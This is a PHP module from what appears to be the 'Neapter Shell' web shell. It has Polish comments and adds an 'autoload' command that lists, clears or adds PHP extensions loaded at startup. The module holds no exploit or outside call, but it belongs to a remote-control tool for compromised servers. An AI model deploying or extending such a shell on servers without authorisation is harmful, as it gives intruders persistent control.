<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleAutoload extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('autoload');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wczytywanie rozszerzeń PHP

    Rozszerzenia te wczytywane są za każdym razem podczas startu

    Użycie:
        autoload -l - wyświetlanie rozszerzen, które zostały wczytane
        autoload -f - odłączenie wszystkich rozszerzen
        autoload nazwa_rozszerzenia [sciezka_do_rozszerzenia rozszerzenie]

    Przykład:
        autoload imap
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $iArgs = $this->oArgs->getNumberOfParams();
        $aSwitches = $this->oArgs->getSwitches();

        if (($iArgs === 0) && !$aSwitches) {
            return self::getHelp();
        }

        $aAutoload = array();


        if (($iArgs == 0) && array_key_exists('l', $aSwitches)) {
            $aAutoload = $this->oUtils->autoloadModulesGet();

            if ($aAutoload === array()) {
                return 'Nie wczytano żadnych rozszerzeń';
            }

            return sprintf(
                "Wczytane rozszerzenia:\r\n\r\n%s",
                implode("\r\n", $aAutoload)
            );
        }

        if (($iArgs === 0) && array_key_exists('f', $aSwitches)) {
            return sprintf(
                'Plik z rozszerzeniami %szostał usunięty',
                !$this->oUtils->removeLoadedModules() ? 'nie ' : ''
            );
        }

        $this->oUtils->autoloadModulesAdd($this->oArgs->getParams());

        return sprintf(
            "Wczytane rozszerzenia:\r\n%s",
            implode("\r\n", $this->oUtils->autoloadModulesGet())
        );
    }
}
